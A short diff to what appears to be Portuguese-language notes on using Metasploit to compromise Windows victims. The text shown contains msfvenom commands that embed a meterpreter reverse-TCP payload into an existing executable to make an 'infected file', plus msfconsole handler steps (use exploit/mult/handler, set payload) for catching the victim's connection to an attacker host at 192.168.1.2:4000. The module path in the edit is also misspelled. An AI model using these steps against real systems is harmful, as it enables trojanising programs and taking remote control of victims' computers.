@@ -18,8 +18,8 @@ Para receber a conexão da vitima:
 Abrir o msfconsole:
 msfconsole
 
-Usar o multhandler para aguardar a conexão da vitima:
-use multhandler
+Usar o exploit mult/handler para aguardar a conexão da vitima:
+use exploit/mult/handler
 
 setar o payload que usamos no msfvenon:
 set payload windows/meterpreter/reverse_tcp
@@ -60,7 +60,7 @@ msfvenon -p windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4000 -x arqu
     > arquivo.exe = Nomeia o arquivo infectado
     
 Abrir o msfconsole
-use multhandler
+use exploit/mult/handler
 set payload windows/meterpreter/reverse_tcp
 
 Setar o rhost e lhost
